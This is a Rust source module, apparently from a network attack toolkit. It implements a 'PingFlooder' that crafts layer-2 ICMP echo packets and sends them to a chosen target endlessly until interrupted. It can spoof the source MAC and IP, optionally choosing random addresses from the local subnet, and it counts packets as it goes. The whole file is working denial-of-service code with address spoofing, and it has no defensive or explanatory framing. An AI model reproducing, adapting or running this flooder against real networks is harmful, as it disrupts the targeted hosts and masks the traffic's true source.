use std::sync::atomic::{ AtomicBool, Ordering };
use std::sync::Arc;
use std::net::Ipv4Addr;
use crate::engines::PingArgs;
use crate::addrs::Mac;
use crate::builders::Packets;
use crate::generators::RandomValues;
use crate::iface::{ Iface, SysInfo };
use crate::sockets::Layer2Socket;
use crate::utils::{ abort, inline_display, get_first_and_last_ip, CtrlCHandler, resolve_mac };



pub struct PingFlooder {
    rand      : RandomValues,
    builder   : Packets,
    iface     : Iface,
    pkts_sent : usize,
    src_ip    : Option<Ipv4Addr>,
    src_mac   : Option<Mac>,
    dst_ip    : Ipv4Addr,
    dst_mac   : Mac,
}


impl PingFlooder {

    pub fn new(args: PingArgs) -> Self {
        let iface = SysInfo::iface_from_ip(args.dst_ip);
        let cidr  = iface.cidr().unwrap_or_else(|e| abort(e));
        
        let (first_ip, last_ip) = get_first_and_last_ip(&cidr);

        Self {
            rand      : RandomValues::new(Some(first_ip), Some(last_ip)),
            builder   : Packets::new(),
            pkts_sent : 0,
            src_ip    : args.src_ip,
            src_mac   : resolve_mac(args.src_mac, &iface),
            dst_ip    : args.dst_ip,
            dst_mac   : resolve_mac(Some(args.dst_mac), &iface).unwrap(),
            iface,
        }
    }

    
    
    pub fn execute(&mut self){
        self.display_exec_info();
        self.send_endlessly();
    }


    
    fn display_exec_info(&self) {
        let src_mac = match self.src_mac {
            Some(mac) => mac.to_string(),
            None      => "Random".to_string(),
        };

        let src_ip = match self.src_ip {
            Some(ip) => ip.to_string(),
            None     => "Random".to_string(),
        };

        let dst_mac = self.dst_mac.to_string();

        println!("SRC >> MAC: {} / IP: {}", src_mac, src_ip);
        println!("DST >> MAC: {} / IP: {}", dst_mac, self.dst_ip);
        println!("IFACE: {}", self.iface.name());
    }



    fn send_endlessly(&mut self) {
        let socket  = Layer2Socket::new(&self.iface);
        let running = Arc::new(AtomicBool::new(true));
        CtrlCHandler::setup(running.clone());

        while running.load(Ordering::SeqCst) {
            let pkt = self.get_packet();
            socket.send(pkt);
            
            self.pkts_sent += 1;
            inline_display(&format!("Packets sent: {}", &self.pkts_sent));
        }
        
        println!("\nFlood interrupted");
    }



    #[inline]
    fn get_packet(&mut self) -> &[u8] {
        self.builder.icmp_ping_ether(
            self.src_mac.unwrap_or_else(|| self.rand.random_mac()),
            self.src_ip.unwrap_or_else( || self.rand.random_ip()),
            self.dst_mac,
            self.dst_ip
        )
    }

}



impl crate::EngineTrait for PingFlooder {
    type Args = PingArgs;
    
    fn new(args: Self::Args) -> Self {
        PingFlooder::new(args)
    }
    
    fn execute(&mut self) {
        self.execute();
    }
}